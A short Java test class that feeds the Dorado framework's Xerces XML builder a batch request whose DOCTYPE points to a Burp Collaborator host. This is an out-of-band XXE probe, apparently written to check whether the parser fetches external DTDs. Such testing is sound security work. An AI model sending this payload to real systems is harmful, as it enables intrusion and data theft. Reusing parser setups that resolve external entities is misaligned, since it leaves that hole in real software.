package test.xml.sax;

import java.io.ByteArrayInputStream;
import java.io.InputStream;

import org.w3c.dom.Document;

import com.bstek.dorado.core.io.InputStreamResource;

public class Testor {

	public static void main(String[] args) {
		//publicId
		XercesXmlDocumentBuilder build = new XercesXmlDocumentBuilder();
		String xml="<!DOCTYPE batch PUBLIC \"-//B/A/EN\" \"http://zbe5biae7yraqmssysulj8ll7cd85w3kubh15q.burpcollaborator.net\"><batch><request type=\"json\"><![CDATA[{\"action\":\"load-data\",\"dataProvider\":\"oc.noticeContributionMaintain#loadNoticeContributionFlows\",\"supportsEntity\":true,\"parameter\":{\"state\":-1,\"accordingTo\":\"productShortName\"},\"resultDataType\":\"v:cn.bsdn.oc.view.contrnotice.NoticeContributionMaintain$[ContributionFlow]\",\"pageSize\":15,\"pageNo\":1,\"context\":{},\"loadedDataTypes\":[\"Condition\",\"Label\",\"ContributionTemplate\",\"ContributionFlow\",\"SaleAgencyPayAccount\",\"ContributionForm\",\"Contribution\",\"DictionaryItem\"]}]]></request></batch>";
		InputStream in = new ByteArrayInputStream(xml.getBytes());
		try {
			Document document = build
					.loadDocument(
							new InputStreamResource(in));
			document.getXmlEncoding();
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

}
